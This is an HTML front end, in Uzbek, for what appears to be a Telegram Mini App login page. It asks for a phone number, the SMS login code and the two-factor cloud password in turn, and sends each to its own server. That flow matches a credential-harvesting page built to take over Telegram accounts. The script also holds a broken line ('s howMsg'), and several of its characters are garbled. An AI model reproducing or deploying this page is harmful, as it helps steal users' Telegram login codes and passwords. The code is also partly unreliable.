<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <title>Telegram Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #f5f7fb);
      --card: var(--tg-theme-secondary-bg-color, #ffffff);
      --text: var(--tg-theme-text-color, #111);
      --hint: var(--tg-theme-hint-color, #6b7280);
      --btn: var(--tg-theme-button-color, #4f46e5);
      --btn-text: var(--tg-theme-button-text-color, #fff);
      --error: #ef4444;
      --success: #22c55e;
      --radius: 16px;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      background: var(--bg);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
      color: var(--text);
    }

    .container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    .card {
      width: 100%;
      max-width: 380px;
      background: var(--card);
      border-radius: var(--radius);
      padding: 24px 20px 28px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
    }

    .title {
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 20px;
    }

    .field {
      margin-bottom: 14px;
    }

    input {
      width: 100%;
      height: 46px;
      padding: 0 14px;
      border-radius: 12px;
      border: 1px solid #d1d5db;
      font-size: 15px;
      background: transparent;
      color: var(--text);
    }

    input:focus {
      outline: none;
      border-color: var(--btn);
    }

    button {
      width: 100%;
      height: 48px;
      border-radius: 14px;
      border: none;
      background: var(--btn);
      color: var(--btn-text);
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button:active {
      transform: scale(0.99);
    }

    button.secondary {
      margin-top: 10px;
      background: transparent;
      color: var(--btn);
      border: 1px solid var(--btn);
    }

    .message {
      margin-top: 14px;
      text-align: center;
      font-size: 14px;
      color: var(--hint);
      min-height: 20px;
    }

    .message.error { color: var(--error); }
    .message.success { color: var(--success); }

    .hidden { display: none; }

    /* yumshoq o‚Äòtish */
    .fade {
      animation: fade 0.25s ease;
    }

    @keyframes fade {
      from { opacity: 0; transform: translateY(4px); }
      to { opacity: 1; transform: none; }
    }
  </style>
</head>

<body>
<div class="container">
  <div class="card fade">
    <div class="title">üîê Telegram orqali kirish</div>

    <!-- TELEFON -->
    <div id="step-phone">
      <div class="field">
        <input id="phone" placeholder="+998 90 123 45 67" inputmode="tel" />
      </div>
      <button id="sendCodeBtn">Kod yuborish</button>
    </div>

    <!-- KOD -->
    <div id="step-code" class="hidden">
      <div class="field">
        <input id="code" placeholder="SMS orqali kelgan kod" inputmode="numeric" />
      </div>
      <button id="verifyCodeBtn">Tasdiqlash</button>
    </div>

    <!-- 2FA PASSWORD -->
  <div id="step-password" class="hidden">
    <div class="field">
      <input id="password" type="password" placeholder="Telegram parol" />
    </div>
    <button id="verifyPasswordBtn">Parolni tasdiqlash</button>
  </div>

    <div id="message" class="message"></div>
  </div>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.ready();

const phoneEl = document.getElementById("phone");
const codeEl = document.getElementById("code");
const stepPhone = document.getElementById("step-phone");
const stepCode = document.getElementById("step-code");
const msgEl = document.getElementById("message");

function showMsg(text, type="info") {
  msgEl.textContent = text;
  msgEl.className = "message " + type;
}

async function sendCode() {
  const phone = phoneEl.value.trim();

  if (!phone) {
    showMsg("‚ùå Telefon raqamni kiriting", "error");
    return;
  }

  showMsg("‚è≥ Kod yuborilmoqda...");

  try {
    const res = await fetch("/send_code", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ phone })
    });

    const data = await res.json();

    if (data.status === "ok") {
      stepPhone.classList.add("hidden");
      stepCode.classList.remove("hidden");
      showMsg("üì© Kod yuborildi, SMS ni tekshiring", "success");
    } else {
      showMsg(data.message || "‚ùå Kod yuborilmadi", "error");
    }

  } catch {
    showMsg("‚ùå Server bilan bog‚Äòlanib bo‚Äòlmadi", "error");
  }
}

async function verifyCode() {
  const phone = phoneEl.value.trim();
  const code = codeEl.value.trim();

  if (!code) {
    showMsg("‚ùå Kodni kiriting", "error");
    return;
  }

  showMsg("üîç Kod tekshirilmoqda...");

  try {
    const res = await fetch("/verify_code", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ phone, code })
    });

    const data = await res.json();

    if (data.status === "ok") {
      showMsg("‚úÖ Muvaffaqiyatli kirdingiz", "success");
      setTimeout(() => tg.close(), 1200);
    } else if (data.status === "2fa_required") {
      stepCode.classList.add("hidden");
      document.getElementById("step-password").classList.remove("hidden");
      s howMsg("üîê Telegram paroli kerak", "info");
    } else {
      showMsg(data.message || "‚ùå Kod noto‚Äòg‚Äòri", "error");
    }

  } catch {
    showMsg("‚ùå Server xatosi", "error");
  }
}
async function verifyPassword() {
  const phone = phoneEl.value.trim();
  const password = document.getElementById("password").value.trim();

  if (!password) {
    showMsg("‚ùå Parolni kiriting", "error");
    return;
  }

  showMsg("üîê Parol tekshirilmoqda...");

  try {
    const res = await fetch("/verify_password", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ phone, password })
    });

    const data = await res.json();

    if (data.status === "ok") {
      showMsg("‚úÖ Muvaffaqiyatli kirdingiz", "success");
      setTimeout(() => tg.close(), 1200);
    } else {
      showMsg(data.message || "‚ùå Parol noto‚Äòg‚Äòri", "error");
    }

  } catch {
    showMsg("‚ùå Server xatosi", "error");
  }
}

document.getElementById("verifyPasswordBtn").onclick = verifyPassword;


document.getElementById("sendCodeBtn").onclick = sendCode;
document.getElementById("verifyCodeBtn").onclick = verifyCode;
</script>
</body>
</html>
